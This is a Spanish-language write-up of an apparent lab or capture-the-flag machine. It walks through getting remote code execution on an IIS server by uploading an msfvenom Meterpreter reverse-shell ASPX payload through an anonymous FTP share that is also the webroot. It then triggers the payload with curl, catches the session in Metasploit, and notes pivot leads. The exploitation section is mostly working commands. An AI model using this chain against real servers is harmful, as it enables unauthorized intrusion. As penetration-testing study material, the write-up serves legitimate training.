- Nombre del computador: WINSERVER-02
- Servicios relevantes: FTP (21) con acceso anónimo, IIS 8.5 (80) con **WebDAV** habilitado, SMB (135/139/445), RDP (3389) y WinRM (5985).

## Puerto 21 (FTP anónimo)

El escaneo confirma que el FTP permite login anónimo (`Anonymous FTP login allowed (FTP code 230)`) y, además, el listado muestra que su contenido es exactamente el mismo que sirve el IIS en el puerto 80 (`iisstart.htm`, `aspnet_client`, `cmdasp.aspx`...). Es decir, el directorio raíz del FTP es también el *webroot* del servidor.

Esto es clave: como el IIS tiene **WebDAV** activado y el FTP permite subir archivos, podemos escribir un archivo en el FTP y luego ejecutarlo a través del navegador o con `curl`, ya que quedará accesible como página web.

## Explotación — subida de payload vía FTP

Generamos un payload Meterpreter en formato `.aspx` con msfvenom (ASPX porque el servidor es IIS):

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f aspx > shell86.aspx
```

Lo subimos por FTP en modo binario:

```sh
ftp 192.168.100.51
binary
put shell86.aspx
```

Levantamos el handler en Metasploit para recibir la sesión:

```sh
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.51
set LPORT 4444
run
```

Y disparamos el payload accediendo a él por HTTP (al estar en el webroot, el IIS lo ejecuta):

```sh
curl http://192.168.100.51/shell86.aspx
```

Con esto obtenemos la sesión de Meterpreter. Pasamos a una shell del sistema:

```sh
shell
```

## Resumen de la cadena de ataque

```
Nmap → FTP anónimo + IIS/WebDAV comparten webroot → subir shell86.aspx (msfvenom) por FTP
     → ejecutar vía curl → Meterpreter sobre WINSERVER-02 → flag del Administrator
     → enumeración de red revela la red interna 192.168.0.0/24 (DNS 192.168.0.2)
```

## Lecciones clave

- Cuando un **FTP anónimo comparte directorio con el webroot**, subir + ejecutar es un vector directo a RCE.
- En IIS, el payload debe ir en **`.aspx`**, no en `.php`.
- Revisar siempre `ipconfig /all` y `route print` tras conseguir shell: el **DNS 192.168.0.2** fue la pista del segmento interno a pivotar.
